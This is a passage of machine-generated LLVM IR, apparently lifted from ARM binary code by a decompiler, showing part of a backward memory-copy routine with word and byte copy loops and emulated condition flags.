  %v3_150b4 = udiv i32 %v5_150a4, 16777216
  %v4_150b8 = mul i32 %v8_150a4, 256
  %v5_150b8 = or i32 %v4_150b8, %v3_150b4
  store i32 %v5_150b8, i32* %r5.global-to-local, align 4
  %v3_150bc = udiv i32 %v8_150a4, 16777216
  %v4_150c0 = mul i32 %v11_150a4, 256
  %v5_150c0 = or i32 %v4_150c0, %v3_150bc
  store i32 %v5_150c0, i32* @ip, align 4
  %v1_150c4 = inttoptr i32 %v0_150c4 to i32*
  store i32 %v5_150a8, i32* %v1_150c4, align 4
  %v3_150c4 = add i32 %v0_150c4, 4
  %v4_150c4 = inttoptr i32 %v3_150c4 to i32*
  %v5_150c4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_150c4, i32* %v4_150c4, align 4
  %v6_150c4 = add i32 %v0_150c4, 8
  %v7_150c4 = inttoptr i32 %v6_150c4 to i32*
  %v8_150c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_150c4, i32* %v7_150c4, align 4
  %v9_150c4 = add i32 %v0_150c4, 12
  %v10_150c4 = inttoptr i32 %v9_150c4 to i32*
  %v11_150c4 = load i32, i32* @ip, align 4
  store i32 %v11_150c4, i32* %v10_150c4, align 4
  %v12_150c4 = add i32 %v0_150c4, 16
  store i32 %v12_150c4, i32* @r0, align 4
  %v0_150c8 = load i32, i32* %r2.global-to-local, align 4
  %v2_150c8 = add i32 %v0_150c8, -16
  store i32 %v2_150c8, i32* %r2.global-to-local, align 4
  %v6_150cc = icmp slt i32 %v0_150c8, 16
  br i1 %v6_150cc, label %dec_label_pc_150d0, label %dec_label_pc_150a0.dec_label_pc_150a0_crit_edge

dec_label_pc_150a0.dec_label_pc_150a0_crit_edge:  ; preds = %dec_label_pc_150a0
  %v0_150a0.pre = load i32, i32* @lr, align 4
  %v0_150a4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_150a0

dec_label_pc_150d0:                               ; preds = %dec_label_pc_150a0
  %v2_150d0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_150d0, i32* @r4, align 4
  %v5_150d0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_150d0, i32* @r5, align 4
  %v2_150d4 = add i32 %v0_150c8, -4
  store i32 %v2_150d4, i32* %r2.global-to-local, align 4
  %v4_150d4 = add i32 %v0_150c8, 2147483632
  %v5_150d4 = and i32 %v2_150d4, %v4_150d4
  %v6_150d4 = icmp slt i32 %v5_150d4, 0
  store i1 %v6_150d4, i1* %cpsr_v.global-to-local, align 1
  %v7_150d4 = icmp slt i32 %v2_150d4, 0
  store i1 %v7_150d4, i1* %cpsr_n.global-to-local, align 1
  %v5_150d8 = icmp slt i32 %v2_150c8, -12
  br i1 %v5_150d8, label %dec_label_pc_150f4, label %dec_label_pc_150dc

dec_label_pc_150dc:                               ; preds = %dec_label_pc_150d0, %dec_label_pc_15090, %dec_label_pc_150dc
  %v1_150e8 = phi i32 [ %v4_150e8, %dec_label_pc_150dc ], [ %v12_150c4, %dec_label_pc_150d0 ], [ %v0_14fec74, %dec_label_pc_15090 ]
  %v0_150dc = load i32, i32* @lr, align 4
  %v3_150dc = udiv i32 %v0_150dc, 16777216
  store i32 %v3_150dc, i32* %ip.global-to-local, align 4
  %v0_150e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_150e0 = inttoptr i32 %v0_150e0 to i32*
  %v2_150e0 = load i32, i32* %v1_150e0, align 4
  store i32 %v2_150e0, i32* @lr, align 4
  %v4_150e0 = add i32 %v0_150e0, 4
  store i32 %v4_150e0, i32* %r1.global-to-local, align 4
  %v4_150e4 = mul i32 %v2_150e0, 256
  %v5_150e4 = or i32 %v4_150e4, %v3_150dc
  store i32 %v5_150e4, i32* @ip, align 4
  %v2_150e8 = inttoptr i32 %v1_150e8 to i32*
  store i32 %v5_150e4, i32* %v2_150e8, align 4
  %v3_150e8 = load i32, i32* @r0, align 4
  %v4_150e8 = add i32 %v3_150e8, 4
  store i32 %v4_150e8, i32* @r0, align 4
  %v0_150ec = load i32, i32* %r2.global-to-local, align 4
  %v2_150ec = add i32 %v0_150ec, -4
  store i32 %v2_150ec, i32* %r2.global-to-local, align 4
  %v6_150f0 = icmp slt i32 %v0_150ec, 4
  br i1 %v6_150f0, label %dec_label_pc_150f4.loopexit, label %dec_label_pc_150dc

dec_label_pc_150f4.loopexit:                      ; preds = %dec_label_pc_150dc
  %v4_150ec = sub i32 3, %v0_150ec
  %v5_150ec = and i32 %v4_150ec, %v0_150ec
  %v6_150ec = icmp slt i32 %v5_150ec, 0
  %v7_150ec = icmp slt i32 %v2_150ec, 0
  store i1 %v6_150ec, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_150ec, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_150f4

dec_label_pc_150f4:                               ; preds = %dec_label_pc_150f4.loopexit, %dec_label_pc_150d0
  %v2_14f5c113 = phi i32 [ %v4_150e8, %dec_label_pc_150f4.loopexit ], [ %v12_150c4, %dec_label_pc_150d0 ]
  %v0_14f4c109 = phi i32 [ %v2_150ec, %dec_label_pc_150f4.loopexit ], [ %v2_150d4, %dec_label_pc_150d0 ]
  %v0_150f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_150f4 = add i32 %v0_150f4, -1
  store i32 %v1_150f4, i32* @r1, align 4
  br label %bb131

dec_label_pc_150fc:                               ; preds = %dec_label_pc_14eb0
  %v1_150fc = load i32, i32* @r2, align 4
  %v2_150fc = add i32 %v1_150fc, %v0_14eb0
  store i32 %v2_150fc, i32* @r1, align 4
  %v2_15100 = add i32 %v1_150fc, %v1_14eb0
  store i32 %v2_15100, i32* %r0.global-to-local, align 4
  %v2_15104 = add i32 %v1_150fc, -4
  store i32 %v2_15104, i32* %r2.global-to-local, align 4
  %v4_15104 = sub i32 3, %v1_150fc
  %v5_15104 = and i32 %v4_15104, %v1_150fc
  %v6_15104 = icmp slt i32 %v5_15104, 0
  store i1 %v6_15104, i1* %cpsr_v.global-to-local, align 1
  %v7_15104 = icmp slt i32 %v2_15104, 0
  store i1 %v7_15104, i1* %cpsr_n.global-to-local, align 1
  %v5_15108 = icmp slt i32 %v1_150fc, 4
  br i1 %v5_15108, label %bb141, label %dec_label_pc_1510c

dec_label_pc_1510c:                               ; preds = %dec_label_pc_150fc
  %v1_1510c = urem i32 %v2_15100, 4
  store i32 %v1_1510c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1510c = icmp eq i32 %v1_1510c, 0
  br i1 %v2_1510c, label %dec_label_pc_15114, label %dec_label_pc_151b4

dec_label_pc_15114:                               ; preds = %dec_label_pc_1510c
  %v1_15114 = urem i32 %v2_150fc, 4
  store i32 %v1_15114, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15114 = icmp eq i32 %v1_15114, 0
  br i1 %v2_15114, label %dec_label_pc_1511c, label %dec_label_pc_151e0

dec_label_pc_1511c:                               ; preds = %dec_label_pc_15114, %dec_label_pc_151d8
  %v0_1513448 = phi i32 [ %v2_15100, %dec_label_pc_15114 ], [ %v0_1522831, %dec_label_pc_151d8 ]
  %v0_1513047 = phi i32 [ %v2_150fc, %dec_label_pc_15114 ], [ %v0_151d8, %dec_label_pc_151d8 ]
  %v0_1511c = phi i32 [ %v2_15104, %dec_label_pc_15114 ], [ %v2_151d0, %dec_label_pc_151d8 ]
  %v2_1511c = add i32 %v0_1511c, -8
  store i32 %v2_1511c, i32* %r2.global-to-local, align 4
  %v4_1511c = sub i32 7, %v0_1511c
  %v5_1511c = and i32 %v4_1511c, %v0_1511c
  %v6_1511c = icmp slt i32 %v5_1511c, 0
  store i1 %v6_1511c, i1* %cpsr_v.global-to-local, align 1
  %v7_1511c = icmp slt i32 %v2_1511c, 0
  store i1 %v7_1511c, i1* %cpsr_n.global-to-local, align 1
  %v5_15120 = icmp slt i32 %v0_1511c, 8
  br i1 %v5_15120, label %dec_label_pc_1516c, label %dec_label_pc_15124

dec_label_pc_15124:                               ; preds = %dec_label_pc_1511c
  %v3_15124 = load i32, i32* @r4, align 4
  store i32 %v3_15124, i32* %stack_var_-8, align 4
  %v6_15124 = load i32, i32* @lr, align 4
  %v2_15128 = add i32 %v0_1511c, -28
  store i32 %v2_15128, i32* %r2.global-to-local, align 4
  %v4_15128 = sub i32 27, %v0_1511c
  %v5_15128 = and i32 %v4_15128, %v2_1511c
  %v6_15128 = icmp slt i32 %v5_15128, 0
  store i1 %v6_15128, i1* %cpsr_v.global-to-local, align 1
  %v7_15128 = icmp slt i32 %v2_15128, 0
  store i1 %v7_15128, i1* %cpsr_n.global-to-local, align 1
  %v5_1512c = icmp slt i32 %v2_1511c, 20
  br i1 %v5_1512c, label %dec_label_pc_15148, label %dec_label_pc_15130

dec_label_pc_15130:                               ; preds = %dec_label_pc_15124, %dec_label_pc_15130.dec_label_pc_15130_crit_edge
  %v0_15134 = phi i32 [ %v1_1513c, %dec_label_pc_15130.dec_label_pc_15130_crit_edge ], [ %v0_1513448, %dec_label_pc_15124 ]
  %v0_15130 = phi i32 [ %v0_15130.pre, %dec_label_pc_15130.dec_label_pc_15130_crit_edge ], [ %v0_1513047, %dec_label_pc_15124 ]
  %v1_15130 = add i32 %v0_15130, -4
  %v2_15130 = inttoptr i32 %v1_15130 to i32*
  %v3_15130 = load i32, i32* %v2_15130, align 4
  store i32 %v3_15130, i32* %r3.global-to-local, align 4
  %v4_15130 = add i32 %v0_15130, -8
  %v5_15130 = inttoptr i32 %v4_15130 to i32*
  %v6_15130 = load i32, i32* %v5_15130, align 4
  store i32 %v6_15130, i32* %r4.global-to-local, align 4
  %v7_15130 = add i32 %v0_15130, -12
  %v8_15130 = inttoptr i32 %v7_15130 to i32*
  %v9_15130 = load i32, i32* %v8_15130, align 4
  store i32 %v9_15130, i32* %ip.global-to-local, align 4
  %v10_15130 = add i32 %v0_15130, -16
  %v11_15130 = inttoptr i32 %v10_15130 to i32*
  %v12_15130 = load i32, i32* %v11_15130, align 4
  store i32 %v12_15130, i32* %lr.global-to-local, align 4
  store i32 %v10_15130, i32* %r1.global-to-local, align 4
  %v1_15134 = add i32 %v0_15134, -16
  %v2_15134 = inttoptr i32 %v1_15134 to i32*
  store i32 %v3_15130, i32* %v2_15134, align 4
  %v4_15134 = add i32 %v0_15134, -12
  %v5_15134 = inttoptr i32 %v4_15134 to i32*
  %v6_15134 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_15134, i32* %v5_15134, align 4
  %v7_15134 = add i32 %v0_15134, -8
  %v8_15134 = inttoptr i32 %v7_15134 to i32*
  %v9_15134 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_15134, i32* %v8_15134, align 4
  %v10_15134 = add i32 %v0_15134, -4
  %v11_15134 = inttoptr i32 %v10_15134 to i32*
  %v12_15134 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15134, i32* %v11_15134, align 4
  store i32 %v1_15134, i32* %r0.global-to-local, align 4
  %v0_15138 = load i32, i32* %r1.global-to-local, align 4
  %v1_15138 = add i32 %v0_15138, -4
  %v2_15138 = inttoptr i32 %v1_15138 to i32*
  %v3_15138 = load i32, i32* %v2_15138, align 4
  store i32 %v3_15138, i32* %r3.global-to-local, align 4
  %v4_15138 = add i32 %v0_15138, -8
  %v5_15138 = inttoptr i32 %v4_15138 to i32*
  %v6_15138 = load i32, i32* %v5_15138, align 4
  store i32 %v6_15138, i32* %r4.global-to-local, align 4
  %v7_15138 = add i32 %v0_15138, -12
  %v8_15138 = inttoptr i32 %v7_15138 to i32*
  %v9_15138 = load i32, i32* %v8_15138, align 4
  store i32 %v9_15138, i32* @ip, align 4
  %v10_15138 = add i32 %v0_15138, -16
  %v11_15138 = inttoptr i32 %v10_15138 to i32*
  %v12_15138 = load i32, i32* %v11_15138, align 4
  store i32 %v12_15138, i32* %lr.global-to-local, align 4
  store i32 %v10_15138, i32* @r1, align 4
  %v1_1513c = add i32 %v0_15134, -32
  %v2_1513c = inttoptr i32 %v1_1513c to i32*
  store i32 %v3_15138, i32* %v2_1513c, align 4
  %v4_1513c = add i32 %v0_15134, -28
  %v5_1513c = inttoptr i32 %v4_1513c to i32*
  %v6_1513c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1513c, i32* %v5_1513c, align 4
  %v7_1513c = add i32 %v0_15134, -24
  %v8_1513c = inttoptr i32 %v7_1513c to i32*
  %v9_1513c = load i32, i32* @ip, align 4
  store i32 %v9_1513c, i32* %v8_1513c, align 4
  %v10_1513c = add i32 %v0_15134, -20
  %v11_1513c = inttoptr i32 %v10_1513c to i32*
  %v12_1513c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1513c, i32* %v11_1513c, align 4
  store i32 %v1_1513c, i32* %r0.global-to-local, align 4
  %v0_15140 = load i32, i32* %r2.global-to-local, align 4
  %v2_15140 = add i32 %v0_15140, -32
  store i32 %v2_15140, i32* %r2.global-to-local, align 4
  %v6_15144 = icmp slt i32 %v0_15140, 32
  br i1 %v6_15144, label %dec_label_pc_15148.loopexit, label %dec_label_pc_15130.dec_label_pc_15130_crit_edge

dec_label_pc_15130.dec_label_pc_15130_crit_edge:  ; preds = %dec_label_pc_15130
  %v0_15130.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_15130

dec_label_pc_15148.loopexit:                      ; preds = %dec_label_pc_15130
  %v4_15140 = sub i32 31, %v0_15140
  %v5_15140 = and i32 %v4_15140, %v0_15140
  %v6_15140 = icmp slt i32 %v5_15140, 0
  %v7_15140 = icmp slt i32 %v2_15140, 0
  store i1 %v6_15140, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15140, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15148

dec_label_pc_15148:                               ; preds = %dec_label_pc_15148.loopexit, %dec_label_pc_15124
  %v6_15150 = phi i32 [ %v1_1513c, %dec_label_pc_15148.loopexit ], [ %v0_1513448, %dec_label_pc_15124 ]
  %v0_15158.pr = phi i32 [ %v2_15140, %dec_label_pc_15148.loopexit ], [ %v2_15128, %dec_label_pc_15124 ]
  %v4_15148 = add i32 %v0_15158.pr, 16
  %v6_15148 = sub i32 0, %v0_15158.pr
  %v7_15148 = and i32 %v4_15148, %v6_15148
  %v8_15148 = icmp slt i32 %v7_15148, 0
  store i1 %v8_15148, i1* %cpsr_v.global-to-local, align 1
  %v9_15148 = icmp slt i32 %v4_15148, 0
  store i1 %v9_15148, i1* %cpsr_n.global-to-local, align 1
  %v5_1514c = icmp slt i32 %v0_15158.pr, -16
  br i1 %v5_1514c, label %.thread13, label %bb138

bb138:                                            ; preds = %dec_label_pc_15148
  %v6_1514c = load i32, i32* @r1, align 4
  %v7_1514c = add i32 %v6_1514c, -4
  %v8_1514c = inttoptr i32 %v7_1514c to i32*
  %v9_1514c = load i32, i32* %v8_1514c, align 4
  store i32 %v9_1514c, i32* %r3.global-to-local, align 4
  %v10_1514c = add i32 %v6_1514c, -8
  %v11_1514c = inttoptr i32 %v10_1514c to i32*
  %v12_1514c = load i32, i32* %v11_1514c, align 4
  store i32 %v12_1514c, i32* %r4.global-to-local, align 4
  %v13_1514c = add i32 %v6_1514c, -12
  %v14_1514c = inttoptr i32 %v13_1514c to i32*
  %v15_1514c = load i32, i32* %v14_1514c, align 4
  store i32 %v15_1514c, i32* @ip, align 4
  %v16_1514c = add i32 %v6_1514c, -16
  %v17_1514c = inttoptr i32 %v16_1514c to i32*
  %v18_1514c = load i32, i32* %v17_1514c, align 4
  store i32 %v18_1514c, i32* %lr.global-to-local, align 4
  store i32 %v16_1514c, i32* @r1, align 4
  %v7_15150 = add i32 %v6_15150, -16
  %v8_15150 = inttoptr i32 %v7_15150 to i32*
  store i32 %v9_1514c, i32* %v8_15150, align 4
  %v10_15150 = add i32 %v6_15150, -12
  %v11_15150 = inttoptr i32 %v10_15150 to i32*
  %v12_15150 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_15150, i32* %v11_15150, align 4
  %v13_15150 = add i32 %v6_15150, -8
  %v14_15150 = inttoptr i32 %v13_15150 to i32*
  %v15_15150 = load i32, i32* @ip, align 4
  store i32 %v15_15150, i32* %v14_15150, align 4
  %v16_15150 = add i32 %v6_15150, -4
  %v17_15150 = inttoptr i32 %v16_15150 to i32*
  %v18_15150 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_15150, i32* %v17_15150, align 4
  store i32 %v7_15150, i32* %r0.global-to-local, align 4
  %v6_15154 = load i32, i32* %r2.global-to-local, align 4
  %v7_15154 = add i32 %v6_15154, -16
  store i32 %v7_15154, i32* %r2.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_15148, %bb138
  %v6_15160 = phi i32 [ %v7_15150, %bb138 ], [ %v6_15150, %dec_label_pc_15148 ]
  %v0_15158 = phi i32 [ %v7_15154, %bb138 ], [ %v0_15158.pr, %dec_label_pc_15148 ]
  %v4_15158 = add i32 %v0_15158, 20
  store i32 %v4_15158, i32* %r2.global-to-local, align 4
  %v6_15158 = sub i32 0, %v0_15158
  %v7_15158 = and i32 %v4_15158, %v6_15158
  %v8_15158 = icmp slt i32 %v7_15158, 0
  store i1 %v8_15158, i1* %cpsr_v.global-to-local, align 1
  %v9_15158 = icmp slt i32 %v4_15158, 0
  store i1 %v9_15158, i1* %cpsr_n.global-to-local, align 1
  %v5_1515c = icmp slt i32 %v0_15158, -20
  br i1 %v5_1515c, label %.thread15, label %bb139

bb139:                                            ; preds = %.thread13
  %v6_1515c = load i32, i32* @r1, align 4
  %v7_1515c = add i32 %v6_1515c, -4
  %v8_1515c = inttoptr i32 %v7_1515c to i32*
  %v9_1515c = load i32, i32* %v8_1515c, align 4
  store i32 %v9_1515c, i32* %r3.global-to-local, align 4
  %v10_1515c = add i32 %v6_1515c, -8
  %v11_1515c = inttoptr i32 %v10_1515c to i32*
  %v12_1515c = load i32, i32* %v11_1515c, align 4
  store i32 %v12_1515c, i32* @ip, align 4
  %v13_1515c = add i32 %v6_1515c, -12
  %v14_1515c = inttoptr i32 %v13_1515c to i32*
  %v15_1515c = load i32, i32* %v14_1515c, align 4
  store i32 %v15_1515c, i32* %lr.global-to-local, align 4
  store i32 %v13_1515c, i32* @r1, align 4
  %v7_15160 = add i32 %v6_15160, -12
  %v8_15160 = inttoptr i32 %v7_15160 to i32*
  store i32 %v9_1515c, i32* %v8_15160, align 4
  %v10_15160 = add i32 %v6_15160, -8
  %v11_15160 = inttoptr i32 %v10_15160 to i32*
  %v12_15160 = load i32, i32* @ip, align 4
  store i32 %v12_15160, i32* %v11_15160, align 4
  %v13_15160 = add i32 %v6_15160, -4
  %v14_15160 = inttoptr i32 %v13_15160 to i32*
  %v15_15160 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_15160, i32* %v14_15160, align 4
  store i32 %v7_15160, i32* %r0.global-to-local, align 4
  %v6_15164 = load i32, i32* %r2.global-to-local, align 4
  %v7_15164 = add i32 %v6_15164, -12
  store i32 %v7_15164, i32* %r2.global-to-local, align 4
  br label %.thread15

.thread15:                                        ; preds = %.thread13, %bb139
  %v6_1518456 = phi i32 [ %v6_15160, %.thread13 ], [ %v7_15160, %bb139 ]
  %v0_1516c54 = phi i32 [ %v4_15158, %.thread13 ], [ %v7_15164, %bb139 ]
  %v2_15168 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15168, i32* @r4, align 4
  store i32 %v6_15124, i32* @lr, align 4
  br label %dec_label_pc_1516c

dec_label_pc_1516c:                               ; preds = %dec_label_pc_1511c, %.thread15
  %v7_1517c = phi i32 [ %v0_1513448, %dec_label_pc_1511c ], [ %v6_1518456, %.thread15 ]
  %v0_1516c = phi i32 [ %v2_1511c, %dec_label_pc_1511c ], [ %v0_1516c54, %.thread15 ]
  %v2_1516c = add i32 %v0_1516c, 8
  store i32 %v2_1516c, i32* %r2.global-to-local, align 4
  %v4_1516c = sub i32 0, %v0_1516c
  %v5_1516c = and i32 %v2_1516c, %v4_1516c
  %v6_1516c = icmp slt i32 %v5_1516c, 0
  store i1 %v6_1516c, i1* %cpsr_v.global-to-local, align 1
  %v7_1516c = icmp slt i32 %v2_1516c, 0
  store i1 %v7_1516c, i1* %cpsr_n.global-to-local, align 1
  %v5_15170 = icmp slt i32 %v0_1516c, -8
  br i1 %v5_15170, label %bb141, label %dec_label_pc_15174

dec_label_pc_15174:                               ; preds = %dec_label_pc_1516c
  %v6_15174 = add i32 %v0_1516c, 4
  store i32 %v6_15174, i32* %r2.global-to-local, align 4
  %v8_15174 = sub i32 -5, %v0_1516c
  %v9_15174 = and i32 %v8_15174, %v2_1516c
  %v10_15174 = icmp slt i32 %v9_15174, 0
  store i1 %v10_15174, i1* %cpsr_v.global-to-local, align 1
  %v11_15174 = icmp slt i32 %v6_15174, 0
  store i1 %v11_15174, i1* %cpsr_n.global-to-local, align 1
  %v5_15178 = icmp slt i32 %v2_1516c, 4
  %v6_15178 = load i32, i32* @r1, align 4
  %v7_15178 = add i32 %v6_15178, -4
  %v8_15178 = inttoptr i32 %v7_15178 to i32*
  %v9_15178 = load i32, i32* %v8_15178, align 4
  store i32 %v9_15178, i32* %r3.global-to-local, align 4
  br i1 %v5_15178, label %.thread19, label %bb140

.thread19:                                        ; preds = %dec_label_pc_15174
  store i32 %v7_15178, i32* @r1, align 4
  %v8_1517c = add i32 %v7_1517c, -4
  %v9_1517c = inttoptr i32 %v8_1517c to i32*
  store i32 %v9_15178, i32* %v9_1517c, align 4
  %v10_1517c = load i32, i32* %r0.global-to-local, align 4
  %v11_1517c = add i32 %v10_1517c, -4
  store i32 %v11_1517c, i32* %r0.global-to-local, align 4
  %v0_1518c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb141

bb140:                                            ; preds = %dec_label_pc_15174
  %v10_15180 = add i32 %v6_15178, -8
  %v11_15180 = inttoptr i32 %v10_15180 to i32*
  %v12_15180 = load i32, i32* %v11_15180, align 4
  store i32 %v12_15180, i32* @ip, align 4
  store i32 %v10_15180, i32* @r1, align 4
  %v7_15184 = add i32 %v7_1517c, -8
  %v8_15184 = inttoptr i32 %v7_15184 to i32*
  store i32 %v9_15178, i32* %v8_15184, align 4
  %v10_15184 = add i32 %v7_1517c, -4
  %v11_15184 = inttoptr i32 %v10_15184 to i32*
  %v12_15184 = load i32, i32* @ip, align 4
  store i32 %v12_15184, i32* %v11_15184, align 4
  store i32 %v7_15184, i32* %r0.global-to-local, align 4
  %v6_15188 = load i32, i32* %r2.global-to-local, align 4
  %v7_15188 = add i32 %v6_15188, -4
  store i32 %v7_15188, i32* %r2.global-to-local, align 4
  br label %bb141

bb141:                                            ; preds = %.thread19, %.thread25, %dec_label_pc_1516c, %dec_label_pc_150fc, %dec_label_pc_15330, %dec_label_pc_152c4, %dec_label_pc_15258, %bb140
  %v2_15190 = phi i32 [ %v11_1517c, %.thread19 ], [ %v0_1522831, %.thread25 ], [ %v7_1517c, %dec_label_pc_1516c ], [ %v2_15100, %dec_label_pc_150fc ], [ %v2_1519c64, %dec_label_pc_15330 ], [ %v2_1519c63, %dec_label_pc_152c4 ], [ %v2_1519c62, %dec_label_pc_15258 ], [ %v7_15184, %bb140 ]
  %v0_1518c = phi i32 [ %v0_1518c.pre, %.thread19 ], [ %v2_151d0, %.thread25 ], [ %v2_1516c, %dec_label_pc_1516c ], [ %v2_15104, %dec_label_pc_150fc ], [ %v0_1518c60, %dec_label_pc_15330 ], [ %v0_1518c59, %dec_label_pc_152c4 ], [ %v0_1518c58, %dec_label_pc_15258 ], [ %v7_15188, %bb140 ]
  %v1_1518c = add i32 %v0_1518c, 4
  store i32 %v1_1518c, i32* @r2, align 4
  %v3_1518c = sub i32 0, %v0_1518c
  %v4_1518c = and i32 %v1_1518c, %v3_1518c
  %v5_1518c = icmp slt i32 %v4_1518c, 0
  store i1 %v5_1518c, i1* %cpsr_v.global-to-local, align 1
  %v6_1518c = icmp slt i32 %v1_1518c, 0
  store i1 %v6_1518c, i1* %cpsr_n.global-to-local, align 1
  %v7_1518c = icmp eq i32 %v1_1518c, 0
  store i1 %v7_1518c, i1* @cpsr_z, align 1
  br i1 %v7_1518c, label %.thread122, label %bb142

bb142:                                            ; preds = %bb141
  %v1_15194 = add i32 %v0_1518c, 2
  %v3_15194 = sub i32 -3, %v0_1518c
  %v4_15194 = and i32 %v3_15194, %v1_1518c
  %v5_15194 = icmp slt i32 %v4_15194, 0
  store i1 %v5_15194, i1* %cpsr_v.global-to-local, align 1
  %v6_15194 = icmp slt i32 %v1_15194, 0
  store i1 %v6_15194, i1* %cpsr_n.global-to-local, align 1
  %v7_15194 = icmp eq i32 %v1_1518c, 2
  store i1 %v7_15194, i1* @cpsr_z, align 1
  %v0_15198 = load i32, i32* @r1, align 4
  %v1_15198 = add i32 %v0_15198, -1
  %v2_15198 = inttoptr i32 %v1_15198 to i8*
  %v3_15198 = load i8, i8* %v2_15198, align 1
  %v4_15198 = zext i8 %v3_15198 to i32
  store i32 %v4_15198, i32* %r3.global-to-local, align 4
  store i32 %v1_15198, i32* @r1, align 4
  %v3_1519c = add i32 %v2_15190, -1
  %v4_1519c = inttoptr i32 %v3_1519c to i8*
  store i8 %v3_15198, i8* %v4_1519c, align 1
  %v5_1519c = load i32, i32* %r0.global-to-local, align 4
  %v6_1519c = add i32 %v5_1519c, -1
  store i32 %v6_1519c, i32* %r0.global-to-local, align 4
  %v0_151a0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_151a0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_151a0 = xor i1 %v0_151a0, %v1_151a0
  br i1 %v2_151a0, label %.thread121, label %bb143

bb143:                                            ; preds = %bb142
  %v3_151a0 = load i32, i32* @r1, align 4
  %v4_151a0 = add i32 %v3_151a0, -1
  %v5_151a0 = inttoptr i32 %v4_151a0 to i8*
  %v6_151a0 = load i8, i8* %v5_151a0, align 1
  %v7_151a0 = zext i8 %v6_151a0 to i32
  store i32 %v7_151a0, i32* %r3.global-to-local, align 4
  store i32 %v4_151a0, i32* @r1, align 4
  %v6_151a4 = add i32 %v5_1519c, -2
  %v7_151a4 = inttoptr i32 %v6_151a4 to i8*
  store i8 %v6_151a0, i8* %v7_151a4, align 1
  %v8_151a4 = load i32, i32* %r0.global-to-local, align 4
  %v9_151a4 = add i32 %v8_151a4, -1
  store i32 %v9_151a4, i32* %r0.global-to-local, align 4
  %v1_151a8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_151a8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread121

.thread121:                                       ; preds = %bb142, %bb143
  %v7_151ac = phi i32 [ %v9_151a4, %bb143 ], [ %v6_1519c, %bb142 ]
  %v2_151ac = phi i1 [ %v2_151a8.pre, %bb143 ], [ %v1_151a0, %bb142 ]
  %v1_151ac = phi i1 [ %v1_151a8.pre, %bb143 ], [ %v0_151a0, %bb142 ]
  %v0_151a8 = load i1, i1* @cpsr_z, align 1
  %v3_151a8 = xor i1 %v2_151ac, %v1_151ac
  %v4_151a8 = or i1 %v0_151a8, %v3_151a8
  br i1 %v4_151a8, label %.thread122, label %bb144

bb144:                                            ; preds = %.thread121
  %v5_151a8 = load i32, i32* @r1, align 4
  %v6_151a8 = add i32 %v5_151a8, -1
  %v7_151a8 = inttoptr i32 %v6_151a8 to i8*
  %v8_151a8 = load i8, i8* %v7_151a8, align 1
  %v9_151a8 = zext i8 %v8_151a8 to i32
  store i32 %v9_151a8, i32* %r3.global-to-local, align 4
  store i32 %v6_151a8, i32* @r1, align 4
  %v8_151ac = add i32 %v7_151ac, -1
  %v9_151ac = inttoptr i32 %v8_151ac to i8*
  store i8 %v8_151a8, i8* %v9_151ac, align 1
  %v10_151ac = load i32, i32* %r0.global-to-local, align 4
  %v11_151ac = add i32 %v10_151ac, -1
  store i32 %v11_151ac, i32* %r0.global-to-local, align 4
  br label %.thread122

dec_label_pc_151b4:                               ; preds = %dec_label_pc_1510c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_151b4 = icmp eq i32 %v1_1510c, 1
  store i1 %v8_151b4, i1* %cpsr_n.global-to-local, align 1
  %v1_151b8 = add i32 %v2_150fc, -1
  %v2_151b8 = inttoptr i32 %v1_151b8 to i8*
  %v3_151b8 = load i8, i8* %v2_151b8, align 1
  %v4_151b8 = zext i8 %v3_151b8 to i32
  store i32 %v4_151b8, i32* %r3.global-to-local, align 4
  store i32 %v1_151b8, i32* @r1, align 4
  %v3_151bc = add i32 %v2_15100, -1
  %v4_151bc = inttoptr i32 %v3_151bc to i8*
  store i8 %v3_151b8, i8* %v4_151bc, align 1
  %v5_151bc = load i32, i32* %r0.global-to-local, align 4
  %v6_151bc = add i32 %v5_151bc, -1
  store i32 %v6_151bc, i32* %r0.global-to-local, align 4
  br i1 %v8_151b4, label %.thread25, label %bb145

bb145:                                            ; preds = %dec_label_pc_151b4
  %v9_151b4 = icmp eq i32 %v1_1510c, 2
  %v6_151c0 = load i32, i32* @r1, align 4
  %v7_151c0 = add i32 %v6_151c0, -1
  %v8_151c0 = inttoptr i32 %v7_151c0 to i8*
  %v9_151c0 = load i8, i8* %v8_151c0, align 1
  %v10_151c0 = zext i8 %v9_151c0 to i32
  store i32 %v10_151c0, i32* %r3.global-to-local, align 4
  store i32 %v7_151c0, i32* @r1, align 4
  %v9_151c4 = add i32 %v5_151bc, -2
  %v10_151c4 = inttoptr i32 %v9_151c4 to i8*
  store i8 %v9_151c0, i8* %v10_151c4, align 1
  %v11_151c4 = load i32, i32* %r0.global-to-local, align 4
  %v12_151c4 = add i32 %v11_151c4, -1
  store i32 %v12_151c4, i32* %r0.global-to-local, align 4
  br i1 %v9_151b4, label %.thread25, label %bb146

